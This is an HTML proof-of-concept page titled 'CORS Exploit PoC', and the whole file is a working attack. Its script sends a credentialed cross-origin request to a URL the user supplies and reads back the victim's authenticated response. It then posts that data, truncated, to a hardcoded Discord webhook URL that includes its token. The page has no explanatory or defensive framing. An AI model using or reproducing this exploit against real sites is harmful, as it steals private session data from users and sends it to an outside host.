<!DOCTYPE html>
<html>
<head>
  <title>CORS Exploit PoC</title>
</head>
<body>
  <h2>CORS Exploit PoC</h2>
  <input type="text" id="targetURL" placeholder="Enter vulnerable URL" />
  <button onclick="exploitCORS()">Exploit</button>

  <script>
  function exploitCORS() {
      var targetUrl = document.getElementById("targetURL").value;
      if (!targetUrl) {
          alert("Enter target URL");
          return;
      }

      var req = new XMLHttpRequest();
      req.onload = reqListener;
      req.open("GET", targetUrl, true);
      req.withCredentials = true;
      req.send();
  }

  function reqListener() {
      var data = this.responseText;

      var xhr = new XMLHttpRequest();
      xhr.open("POST", "https://discord.com/api/webhooks/1407359141089116191/GisOB09nPYyq68yzRvNT3HYX2spHB-uekSdotxwyKCAL4PaRfaJBFMpJ_fYaeDSTqJKX", true);
      xhr.setRequestHeader("Content-Type", "application/json");

      // Discord max is 2000 chars, so truncate
      var safeData = data.substring(0, 1900);

      xhr.send(JSON.stringify({
          content: "CORS exploit data:\n```" + safeData + "```"
      }));
  }
  </script>
</body>
